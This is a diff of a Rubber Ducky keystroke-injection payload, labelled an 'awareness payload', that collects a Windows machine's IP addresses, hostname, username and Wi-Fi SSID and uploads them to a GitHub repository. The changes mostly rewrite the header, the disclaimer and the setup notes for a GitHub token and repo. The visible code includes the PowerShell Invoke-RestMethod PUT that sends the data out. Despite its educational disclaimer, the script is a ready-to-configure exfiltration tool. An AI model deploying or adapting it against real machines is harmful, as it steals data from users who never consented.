@@ -1,14 +1,21 @@
 REM --------------------------------------------
-REM Payload Title: Awareness Payload - System Info Grabber
-REM Author:Dakhari Shorter (VemTech6)
-REM Description: This Rubber Ducky script demonstrates how quickly 
-REM              system and network information can be exfiltrated 
-REM              from an unlocked Windows machine. It collects 
-REM              IPv4, IPv6, hostname, username, and Wi-Fi SSID, 
-REM              encodes the data, and uploads it to a GitHub repo.
-REM Disclaimer: FOR EDUCATIONAL AND AWARENESS PURPOSES ONLY.
-REM              Do NOT use this script on machines you do not own 
-REM              or have explicit permission to test.
+REM Payload Title: Awareness Payload - System Info Logger
+REM Author: VemTech6
+REM Date: July 28, 2025
+REM Description: Demonstrates how quickly system and network
+REM information can be exfiltrated from an unlocked Windows
+REM machine via HID injection.
+REM 
+REM ⚠️ For educational and awareness purposes only.
+REM Do NOT use this script on machines you do not own
+REM or have explicit permission to test.
+REM --------------------------------------------
+
+REM ⚠️ Before using this script, replace the following placeholders:
+REM - 'YOUR_GITHUB_TOKEN_HERE' → your GitHub personal access token
+REM - 'YOUR_USERNAME' → your GitHub username
+REM - 'YOUR_REPO' → your repository name
+REM - 'you@example.com' → an email address for commit metadata
 REM --------------------------------------------
 
 REM Begin Payload
@@ -79,4 +86,5 @@ REM Upload to GitHub
 STRING Invoke-RestMethod -Uri $uri -Method PUT -Headers $headers -Body $body;
 ENTER
 
-REM --- End Payload ---
+REM End Payload
+
